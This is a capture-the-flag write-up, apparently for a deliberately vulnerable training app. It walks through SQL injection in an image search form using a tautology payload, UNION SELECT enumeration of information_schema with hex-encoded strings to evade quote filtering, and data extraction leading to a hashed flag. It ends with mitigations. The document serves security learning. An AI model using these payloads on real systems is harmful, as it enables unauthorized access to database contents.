# A1 - SQL Injection (II)

Second SQL injection vulnerability of OWASP Top 10 (2017). Found in the image search form (`Search Images`), where the image number is injected directly into the SQL query.

---

## Steps to Obtain the Flag

### 1. Confirm the Vulnerability (Tautology Bypass)

Enter in the search field:
```
1 or 1
```
The query returns all images in the table. Among them is one named `getThe-flag` or similar, confirming the vulnerability.

---

### 2. Enumerate Database Structure (UNION)

The original query selects **two columns**, so any `UNION SELECT` must respect that number. Quotes are filtered, so strings are passed in **hexadecimal**.

**List tables:**
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()
```
Relevant Result: `list_images` table.

**List columns of `list_images`** (`list_images` in hex = `0x6c6973745f696d61676573`):
```sql
1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```
Columns of interest: `comment` and `title`.

---

### 3. Extract Data and Obtain the Flag

```sql
1 UNION SELECT title, comment FROM list_images
```

Response:
```
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url:   Hack me ?
```

**Process:**
1. The hash `1928e8083cf461a51303633093573c46` is MD5 → decrypts to `albatroz`
2. Convert to lowercase → `albatroz`
3. Apply SHA-256 → result is the **flag**

> Recommended Tool: [CyberChef](https://gchq.github.io/CyberChef/)

---

## Impact

- **Confidentiality:** access to any database data without credentials.
- **Enumeration:** ability to reconstruct the entire internal database structure from a simple form.

---

## Mitigation

1. **Prepared Queries (Parametrized):** most effective defense; input is always treated as literal data.
2. **Input Validation:** whitelists to filter disallowed characters.
3. **Principle of Least Privilege:** database user accesses only what's strictly necessary.
